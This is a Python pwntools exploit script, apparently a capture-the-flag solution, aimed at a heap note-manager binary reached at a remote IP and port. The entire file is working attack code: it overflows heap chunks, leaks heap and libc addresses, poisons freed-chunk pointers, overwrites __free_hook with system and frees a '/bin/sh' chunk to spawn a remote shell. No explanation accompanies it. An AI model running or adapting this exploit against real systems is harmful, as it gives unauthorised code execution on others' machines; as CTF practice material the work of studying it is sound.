#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def create():
    io.sendlineafter(b"option: ", b"1")
    io.sendlineafter(b"content: ", b"A"*8)

def modify(idx, content):
    io.sendlineafter(b"option: ", b"3")
    io.sendlineafter(b"index (0-9): ", str(idx).encode())
    io.sendlineafter(b"content: ", content)

def delete(idx):
    io.sendlineafter(b"option: ", b"4")
    io.sendlineafter(b"index (0-9): ", str(idx).encode())

def read(idx):
    io.sendlineafter(b"option: ", b"2")
    io.sendlineafter(b"index (0-9): ", str(idx).encode())
    io.recvuntil(f"Note [{idx}]: ".encode())
    return u64(io.recvline().strip().ljust(8, b'\x00'))

io = remote("34.252.33.37", 31302)

for i in range(10): create()

modify(8, b"A"*143)
delete(7)
delete(8)

heap_leak = read(9)
create()
create()

modify(0, p64(0x0) + p64(0x501) + p64(0x0)*2)
modify(8, p64(0x0)*7 + p64(0x21) + p64(0x0)*3 + p64(0x21))

delete(5)
delete(4)

modify(2, b"A"*144 + p64(heap_leak - 528))
modify(3, p64(heap_leak - 1216))

create()
create()

delete(5)

modify(2, b"A"*144 + p64(heap_leak - 1216))

libc.address = read(3) - 0x3ebca0

modify(2, b"A"*144 + p64(libc.sym.__free_hook))
modify(3, p64(libc.sym.system))
modify(9, p64(0x0068732f6e69622f))

delete(9)
io.interactive()

